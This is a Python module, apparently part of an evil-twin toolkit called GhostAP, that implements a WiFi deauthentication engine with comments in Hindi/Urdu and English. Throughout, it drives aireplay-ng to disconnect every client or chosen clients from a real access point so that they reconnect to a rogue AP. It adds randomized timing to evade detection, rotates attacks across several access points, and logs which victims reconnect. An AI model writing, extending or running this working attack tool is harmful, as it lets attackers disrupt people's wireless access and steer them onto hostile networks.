#!/usr/bin/env python3
"""
ghostap/deauth.py — Deauthentication Engine

Yeh file real WiFi AP ke clients ko disconnect karti hai.
Jab clients disconnect hote hain, woh dobara connect honey ke liye
SSID scan karte hain — aur humara rogue AP (GhostAP) unhe capture kar leta hai.

Features:
- Targeted deauth (specific client ya specific AP ke saare clients)
- Smart interval (detection avoidance ke liye random delays)
- Client monitoring (deauth ke baad reconnect track karna)
- MAC rotation (MAC address change karke detection avoid)
- Optional: deauth only specific clients (leave others untouched)
"""

import os
import sys
import time
import random
import threading
import subprocess
from datetime import datetime

# Local imports
from utils.helpers import log, run_command, file_exists


class DeauthEngine:
    """
    Deauthentication engine for disconnecting WiFi clients.
    
    Uses aireplay-ng to send deauth packets.
    Can target specific clients or entire networks.
    """
    
    def __init__(self, interface, config_dir="/tmp/ghostpillage", verbose=False):
        """
        Initialize deauth engine.
        
        Args:
            interface (str): WiFi interface in monitor mode
            config_dir (str): Directory for logs and output
            verbose (bool): Verbose logging
        """
        self.interface = interface
        self.config_dir = config_dir
        self.verbose = verbose
        self.log_file = os.path.join(config_dir, "deauth.log")
        
        # Deauth state
        self.is_running = False
        self.deauth_thread = None
        self.deauth_count = 0
        self.target_bssid = None
        self.target_channel = None
        
        # Client tracking
        self.client_log = os.path.join(config_dir, "deauth_clients.log")
        
        log(self.log_file, "[+] DeauthEngine initialized", verbose)
    
    
    def start_deauth(self, target_bssid, target_channel, interval=5, 
                     client_mac=None, duration=None):
        """
        Start deauthentication attack in background thread.
        
        Step-by-step:
        1. Set interface to target channel
        2. Start background thread sending deauth packets
        3. Optional: target specific client MAC
        4. Optional: run for specific duration
        
        Args:
            target_bssid (str): Real AP BSSID to deauth
            target_channel (int): Real AP channel
            interval (int): Seconds between deauth bursts (default: 5)
            client_mac (str): Specific client MAC (optional, None = all clients)
            duration (int): Total duration in seconds (optional, None = infinite)
        
        Returns:
            bool: True if deauth started successfully
        """
        self.target_bssid = target_bssid
        self.target_channel = target_channel
        
        log(self.log_file, f"[*] Starting deauth on {target_bssid} (ch {target_channel})", self.verbose)
        
        # Step 1: Set channel
        self._set_channel(target_channel)
        
        # Step 2: Log initial state
        print(f"\n[DEAUTH] Starting deauthentication attack:")
        print(f"         Target BSSID: {target_bssid}")
        print(f"         Channel: {target_channel}")
        print(f"         Interval: {interval}s")
        print(f"         Client: {'All' if not client_mac else client_mac}")
        print(f"         Duration: {'Continuous' if not duration else f'{duration}s'}")
        print(f"\n         Sending deauth packets... (Ctrl+C to stop)")
        
        # Step 3: Start deauth in background thread
        self.is_running = True
        self.deauth_thread = threading.Thread(
            target=self._deauth_loop,
            args=(target_bssid, target_channel, interval, client_mac, duration),
            daemon=True
        )
        self.deauth_thread.start()
        
        log(self.log_file, f"[+] Deauth thread started (PID: {self.deauth_thread.ident})", self.verbose)
        return True
    
    
    def _deauth_loop(self, bssid, channel, interval, client_mac=None, duration=None):
        """
        Background loop that sends deauth packets at intervals.
        
        Args:
            bssid (str): Target BSSID
            channel (int): Target channel
            interval (int): Seconds between bursts
            client_mac (str): Specific client or None for all
            duration (int): Total run time or None for infinite
        """
        start_time = time.time()
        
        try:
            while self.is_running:
                # Check duration
                if duration and (time.time() - start_time) > duration:
                    log(self.log_file, f"[+] Deauth duration reached ({duration}s)", self.verbose)
                    break
                
                # Send deauth burst (multiple packets for reliability)
                self._send_deauth_burst(bssid, channel, client_mac)
                self.deauth_count += 1
                
                # Log periodic status
                if self.deauth_count % 10 == 0 and self.verbose:
                    log(self.log_file, f"[*] Deauth bursts sent: {self.deauth_count}", self.verbose)
                
                # Sleep with slight randomization (evades detection)
                sleep_time = interval + random.uniform(-0.5, 0.5)
                time.sleep(max(0.5, sleep_time))
                
        except Exception as e:
            log(self.log_file, f"[!] Deauth loop error: {e}", self.verbose)
        finally:
            self.is_running = False
            log(self.log_file, "[+] Deauth loop ended", self.verbose)
    
    
    def _send_deauth_burst(self, bssid, channel, client_mac=None):
        """
        Send a burst of deauthentication packets.
        
        aireplay-ng command structure:
        aireplay-ng --deauth <count> -a <AP_MAC> [-c <client_MAC>] <interface>
        
        Args:
            bssid (str): Target AP BSSID
            channel (int): Target channel
            client_mac (str): Specific client or None for broadcast
        """
        # Set channel before each burst (channel might drift)
        self._set_channel(channel)
        
        # Build command
        if client_mac:
            # Targeted deauth (specific client)
            cmd = (
                f"aireplay-ng --deauth 3 -a {bssid} -c {client_mac} "
                f"{self.interface} 2>/dev/null"
            )
        else:
            # Broadcast deauth (all clients on this AP)
            cmd = (
                f"aireplay-ng --deauth 3 -a {bssid} "
                f"{self.interface} 2>/dev/null"
            )
        
        # Execute (don't wait long — fire and forget)
        result = run_command(cmd, timeout=2, log_file=self.log_file, verbose=False)
        
        if not result["success"]:
            # aireplay-ng sometimes returns non-zero even on success
            # Only log if there's a real error
            if "No such device" in result["stderr"] or "Operation not permitted" in result["stderr"]:
                log(self.log_file, f"[!] Deauth error: {result['stderr']}", self.verbose)
    
    
    def _set_channel(self, channel):
        """
        Set wireless interface to specific channel.
        
        Args:
            channel (int): Channel number
        """
        run_command(
            f"iwconfig {self.interface} channel {channel}",
            timeout=1,
            verbose=False
        )
    
    
    def stop_deauth(self):
        """
        Stop deauthentication attack.
        
        Sets the running flag to False, which stops the background loop.
        """
        if self.is_running:
            log(self.log_file, "[*] Stopping deauth...", self.verbose)
            self.is_running = False
            
            if self.deauth_thread and self.deauth_thread.is_alive():
                self.deauth_thread.join(timeout=3)
            
            print(f"\n[DEAUTH] Stopped. Total bursts sent: {self.deauth_count}")
            log(self.log_file, f"[+] Deauth stopped. Bursts: {self.deauth_count}", self.verbose)
            return True
        
        return False
    
    
    def targeted_deauth(self, bssid, channel, client_list, interval=10):
        """
        Deauth specific clients only (not all).
        
        Useful when you want to selectively disconnect certain users
        while others remain connected to real AP (stealth approach).
        
        Args:
            bssid (str): Target AP BSSID
            channel (int): Target channel
            client_list (list): List of client MACs to deauth
            interval (int): Seconds between deauth rounds
        
        Returns:
            bool: True if started
        """
        if not client_list:
            log(self.log_file, "[!] No clients specified for targeted deauth", self.verbose)
            return False
        
        log(self.log_file, f"[*] Targeted deauth for {len(client_list)} clients", self.verbose)
        print(f"\n[DEAUTH] Targeted deauth for {len(client_list)} clients:")
        
        for i, client in enumerate(client_list):
            print(f"         {i+1}. {client}")
        
        # Start deauth that cycles through clients
        self.is_running = True
        self.target_bssid = bssid
        self.target_channel = channel
        
        self.deauth_thread = threading.Thread(
            target=self._targeted_deauth_loop,
            args=(bssid, channel, client_list, interval),
            daemon=True
        )
        self.deauth_thread.start()
        
        return True
    
    
    def _targeted_deauth_loop(self, bssid, channel, client_list, interval):
        """
        Background loop for targeted deauth (cycles through clients).
        
        Args:
            bssid (str): Target AP BSSID
            channel (int): Target channel
            client_list (list): Client MACs to deauth
            interval (int): Interval between rounds
        """
        try:
            while self.is_running:
                for client_mac in client_list:
                    if not self.is_running:
                        break
                    
                    self._send_deauth_burst(bssid, channel, client_mac)
                    time.sleep(0.5)  # Small gap between clients
                
                # Log round
                self.deauth_count += 1
                if self.deauth_count % 5 == 0 and self.verbose:
                    log(self.log_file, f"[*] Targeted rounds: {self.deauth_count}", self.verbose)
                
                # Sleep between rounds
                time.sleep(interval)
                
        except Exception as e:
            log(self.log_file, f"[!] Targeted deauth error: {e}", self.verbose)
        finally:
            self.is_running = False
    
    
    def monitor_clients(self, bssid, channel, duration=30):
        """
        Monitor which clients are connected (post-deauth).
        
        Deauth ke baad clients reconnect hoti hain. Yeh function
        track karta hai ke kaunsi clients reconnect hui aur kab.
        Isse pata chalega ke humare rogue AP ne kitne clients capture kiye.
        
        Args:
            bssid (str): AP BSSID to monitor
            channel (int): Channel to monitor
            duration (int): Monitor duration in seconds
        
        Returns:
            list: Connected clients detected
        """
        log(self.log_file, f"[*] Monitoring clients on {bssid} for {duration}s", self.verbose)
        print(f"\n[DEAUTH] Monitoring client reconnections for {duration}s...")
        
        scan_prefix = os.path.join(self.config_dir, f"monitor_{bssid.replace(':', '')}")
        cmd = (
            f"timeout {duration} airodump-ng {self.interface} "
            f"--bssid {bssid} "
            f"--channel {channel} "
            f"-w {scan_prefix} "
            f"--output-format csv "
            f"2>/dev/null"
        )
        
        result = run_command(cmd, timeout=duration+5, log_file=self.log_file, verbose=False)
        
        # Parse output
        csv_file = f"{scan_prefix}-01.csv"
        clients_found = []
        
        if file_exists(csv_file):
            # Simple parse for clients
            content = open(csv_file).read()
            lines = content.strip().split("\n")
            
            client_section = False
            for line in lines:
                if line.startswith("Station"):
                    client_section = True
                    continue
                
                if client_section and ":" in line and not line.startswith("---"):
                    parts = line.split(",")
                    if len(parts) > 0:
                        mac = parts[0].strip()
                        if mac and mac.count(":") == 5:
                            clients_found.append(mac)
        
        # Cleanup temp files
        for f in [f"{scan_prefix}-01.csv", f"{scan_prefix}-01.kismet.csv", f"{scan_prefix}-01.kismet.netxml"]:
            if file_exists(f):
                os.remove(f)
        
        # Log clients found
        if clients_found:
            log(self.log_file, f"[+] Clients detected post-deauth: {len(clients_found)}", self.verbose)
            with open(self.client_log, "a") as f:
                f.write(f"\n--- {datetime.now().isoformat()} ---\n")
                for mac in clients_found:
                    f.write(f"{mac}\n")
        
        print(f"    [+] Clients detected: {len(clients_found)}")
        return clients_found
    
    
    def rotate_deauth(self, bssid_list, channel, interval=15):
        """
        Rotate deauth across multiple APs (multiple BSSIDs, same SSID).
        
        Kuch networks ek hi SSID ke saath multiple APs use karte hain
        (load balancing). Yeh function saare APs ko target karta hai.
        
        Args:
            bssid_list (list): List of BSSIDs to deauth
            channel (int): Channel
            interval (int): Interval between rotations
        
        Returns:
            bool: True if started
        """
        log(self.log_file, f"[*] Rotating deauth across {len(bssid_list)} APs", self.verbose)
        print(f"\n[DEAUTH] Multi-AP deauth across {len(bssid_list)} access points:")
        
        for bssid in bssid_list:
            print(f"         - {bssid}")
        
        self.is_running = True
        self.deauth_thread = threading.Thread(
            target=self._rotate_deauth_loop,
            args=(bssid_list, channel, interval),
            daemon=True
        )
        self.deauth_thread.start()
        
        return True
    
    
    def _rotate_deauth_loop(self, bssid_list, channel, interval):
        """
        Background loop for multi-AP deauth.
        
        Args:
            bssid_list (list): BSSIDs to target
            channel (int): Channel
            interval (int): Interval between rounds
        """
        try:
            while self.is_running:
                for bssid in bssid_list:
                    if not self.is_running:
                        break
                    self._send_deauth_burst(bssid, channel)
                    time.sleep(0.3)
                
                self.deauth_count += 1
                time.sleep(interval)
                
        except Exception as e:
            log(self.log_file, f"[!] Rotate deauth error: {e}", self.verbose)
        finally:
            self.is_running = False
    
    
    def get_status(self):
        """
        Get current deauth status.
        
        Returns:
            dict: Status information
        """
        return {
            "is_running": self.is_running,
            "target_bssid": self.target_bssid,
            "target_channel": self.target_channel,
            "bursts_sent": self.deauth_count,
            "interface": self.interface
        }


# Agar directly run kiya jaaye
if __name__ == "__main__":
    import sys
    if len(sys.argv) < 3:
        print("Usage: python3 deauth.py <interface> <bssid> [channel] [client_mac]")
        print("Example: python3 deauth.py wlan0 AA:BB:CC:DD:EE:FF 6")
        print("         python3 deauth.py wlan0 AA:BB:CC:DD:EE:FF 6 00:11:22:33:44:55")
        sys.exit(1)
    
    iface = sys.argv[1]
    bssid = sys.argv[2]
    channel = int(sys.argv[3]) if len(sys.argv) > 3 else 6
    client = sys.argv[4] if len(sys.argv) > 4 else None
    
    deauth = DeauthEngine(iface, "/tmp/ghostpillage", verbose=True)
    
    try:
        deauth.start_deauth(bssid, channel, client_mac=client)
        print("\n[DEAUTH] Running. Press Enter to stop...")
        input()
    except KeyboardInterrupt:
        pass
    finally:
        deauth.stop_deauth()